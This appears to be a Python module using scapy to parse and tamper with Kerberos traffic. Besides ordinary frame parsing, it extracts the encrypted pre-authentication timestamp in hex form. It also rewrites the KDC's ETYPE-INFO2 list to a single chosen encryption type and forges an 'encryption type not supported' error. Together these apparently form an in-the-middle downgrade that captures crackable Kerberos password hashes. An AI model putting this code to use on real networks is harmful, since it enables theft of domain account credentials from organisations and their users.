from __future__ import annotations

from scapy.asn1.asn1 import ASN1_Error, ASN1_INTEGER
from scapy.layers.kerberos import (
    ETYPE_INFO_ENTRY2,
    KRB_AS_REP,
    KRB_AS_REQ,
    KRB_ERROR,
    KRB_KDC_REQ_BODY,
    KRB_TGS_REP,
    KRB_TGS_REQ,
    Kerberos,
    MethodData,
    PADATA,
)

PA_ENC_TIMESTAMP = 2
PA_ETYPE_INFO2 = 19
PA_FX_FAST = 136
NT_ENTERPRISE = 10
KDC_ERR_PREAUTH_REQUIRED = 25
KDC_ERR_PREAUTH_FAILED = 24
KRB_ERROR_MSG_TYPE = 30
KDC_ERR_ETYPE_NOSUPP = 14


def frame(payload: bytes) -> bytes:
    return len(payload).to_bytes(4, "big") + payload


def parse_frame(raw_frame: bytes):
    body = raw_frame[4:]
    try:
        pkt = Kerberos(body)
    except ASN1_Error:
        return None
    return pkt.root


def as_req_body(root) -> KRB_KDC_REQ_BODY | None:
    if not isinstance(root, KRB_AS_REQ):
        return None
    return root.reqBody


def extract_principal(req_body: KRB_KDC_REQ_BODY) -> tuple[str, str]:
    realm = req_body.realm.val.decode()
    cname = req_body.cname
    if cname is None:
        return "", realm
    parts = [n.val.decode() for n in cname.nameString]
    if cname.nameType.val == NT_ENTERPRISE and len(parts) == 1 and "@" in parts[0]:
        username = parts[0].split("@", 1)[0]
    else:
        username = "/".join(parts)
    return username, realm


def is_machine_account(username: str) -> bool:
    return username.endswith("$")


def extract_offered_etypes(req_body: KRB_KDC_REQ_BODY) -> list[int]:
    return [e.val for e in req_body.etype]


def extract_pa_enc_timestamp(root) -> tuple[int, str] | None:
    padata = getattr(root, "padata", None)
    if not padata:
        return None
    for entry in padata:
        if entry.padataType != PA_ENC_TIMESTAMP:
            continue
        enc = entry.padataValue
        if enc is None or not hasattr(enc, "etype"):
            continue
        return enc.etype.val, enc.cipher.val.hex()
    return None


def is_fast_armored(root) -> bool:
    if isinstance(root, KRB_ERROR):
        edata = root.eData
        entries = edata.seq if isinstance(edata, MethodData) else []
    else:
        entries = getattr(root, "padata", None) or []
    return any(entry.padataType == PA_FX_FAST for entry in entries)


_MSG_TYPE_NAMES = {
    KRB_AS_REQ: "AS-REQ",
    KRB_AS_REP: "AS-REP",
    KRB_TGS_REQ: "TGS-REQ",
    KRB_TGS_REP: "TGS-REP",
    KRB_ERROR: "KRB-ERROR",
}


def describe_frame(root) -> str:
    parts = [_MSG_TYPE_NAMES.get(type(root), type(root).__name__)]

    req_body = as_req_body(root)
    if req_body is not None:
        username, realm = extract_principal(req_body)
        parts.append(f"{username}@{realm}")
        parts.append(f"etypes={extract_offered_etypes(req_body)}")

    if isinstance(root, KRB_ERROR):
        edata = root.eData
        entries = edata.seq if isinstance(edata, MethodData) else []
        parts.append(f"errorCode={root.errorCode.val}")
    else:
        entries = getattr(root, "padata", None) or []
    if entries:
        parts.append(f"padata={[e.padataType.val for e in entries]}")

    return " ".join(parts)


def is_preauth_required_error(root) -> bool:
    if not isinstance(root, KRB_ERROR):
        return False
    return (
        root.msgType == KRB_ERROR_MSG_TYPE
        and root.errorCode == KDC_ERR_PREAUTH_REQUIRED
    )


def is_preauth_failed_error(root) -> bool:
    if not isinstance(root, KRB_ERROR):
        return False
    return (
        root.msgType == KRB_ERROR_MSG_TYPE and root.errorCode == KDC_ERR_PREAUTH_FAILED
    )


def is_as_rep(root) -> bool:
    return isinstance(root, KRB_AS_REP)


def _etype_info2_padata(root: KRB_ERROR) -> PADATA | None:
    edata = root.eData
    if edata is None or not isinstance(edata, MethodData):
        return None
    for entry in edata.seq:
        if entry.padataType == PA_ETYPE_INFO2:
            return entry
    return None


def extract_etype_info2_salt(root) -> str | None:
    entry = _etype_info2_padata(root)
    if entry is None:
        return None
    for info in entry.padataValue.seq:
        salt = getattr(info, "salt", None)
        if salt is not None and salt.val:
            return salt.val.decode()
    return None


def extract_etype_info2_etypes(root) -> list[int] | None:
    entry = _etype_info2_padata(root)
    if entry is None:
        return None
    return [e.etype.val for e in entry.padataValue.seq]


def rewrite_etype_info2(raw_frame: bytes, target_etype: int) -> bytes:
    root = parse_frame(raw_frame)
    if root is None:
        return raw_frame
    entry = _etype_info2_padata(root)
    if entry is None:
        return raw_frame
    existing = next(
        (e for e in entry.padataValue.seq if e.etype.val == target_etype), None
    )
    kept = (
        existing
        if existing is not None
        else ETYPE_INFO_ENTRY2(etype=ASN1_INTEGER(target_etype))
    )
    entry.padataValue.seq = [kept]
    return frame(bytes(root))


def build_capture_reply(saved_error_frame: bytes, target_etype: int) -> bytes:
    root = parse_frame(saved_error_frame)
    if root is None:
        return saved_error_frame
    entry = _etype_info2_padata(root)
    if entry is not None:
        entry.padataValue.seq = [
            e for e in entry.padataValue.seq if e.etype.val != target_etype
        ]
    root.errorCode = KDC_ERR_ETYPE_NOSUPP
    return frame(bytes(root))
